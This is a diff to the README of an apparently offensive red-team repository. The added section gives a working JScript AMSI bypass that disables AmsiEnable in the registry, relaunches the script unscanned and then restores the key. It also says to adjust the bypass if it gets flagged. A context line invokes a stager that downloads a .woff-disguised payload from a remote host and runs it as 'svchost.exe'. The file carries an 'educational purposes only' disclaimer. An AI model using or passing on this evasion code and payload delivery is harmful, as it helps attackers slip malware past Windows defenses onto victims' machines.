@@ -112,6 +112,36 @@ Finally add the call of `DownloadAndExecute` to trigger the stager instantiation
     o.DownloadAndExecute "https://192.168.X.X:8080/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
 ```
 
+## JScript
+
+You can also create JScript payloads to deliver the dll via java script. Follow allong but transfer the methodolgy to JS. I believe you are smart enough to figure out how to do.
+
+### AMSI Bypass
+
+Bypassing AMSI highly reduces the detection rate, but DN2JS doesn't provide one natively. So, you can add the below AMSI bypass to your output JScript payloads much like I've done to the examples I've included in this repo.
+
+> NOTE: You must do the bypass **after** the `setversion()` method runs or your payload will break.
+> Credit: [rxwx/bypass.js](https://gist.github.com/rxwx/8955e5abf18dc258fd6b43a3a7f4dbf9) (*although its a pretty well-known bypass*)
+```js
+// 4MS7_BYP455
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
+	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
+	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
+	WScript.Quit(1);
+}
+```
+
+Sometimes the AMSI bypass itself is what gets your payload flagged so feel free to play around with it.
+
 ## Disclaimer
 **WARNING: This repository contains malware and potentially harmful code. It is intended for educational purposes only.**
 
